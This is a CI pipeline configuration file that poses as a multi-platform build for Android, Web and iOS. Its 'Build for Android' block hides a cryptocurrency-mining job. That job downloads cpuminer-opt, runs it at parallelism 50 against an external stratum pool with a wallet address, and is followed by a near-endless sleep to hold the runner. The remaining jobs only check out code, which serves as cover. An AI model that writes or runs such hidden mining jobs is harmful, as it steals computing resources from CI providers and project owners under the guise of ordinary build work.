version: v1.0
name: Multi-platform pipeline
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
blocks:
  - name: Build for Android
    dependencies: []
    task:
      jobs:
        - name: Build
          commands:
            - checkout
        - name: 'Job #2'
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
          parallelism: 50
        - name: 'Job #3'
          commands:
            - Sleep 1737373838384848383838
      agent:
        machine:
          type: e1-standard-2
          os_image: ubuntu1804
  - name: Build for Web
    dependencies: []
    task:
      jobs:
        - name: Build
          commands:
            - checkout
  - name: Test on iOS
    dependencies: []
    task:
      agent:
        machine:
          type: a1-standard-4
          os_image: macos-xcode12
      jobs:
        - name: Tests
          commands:
            - checkout
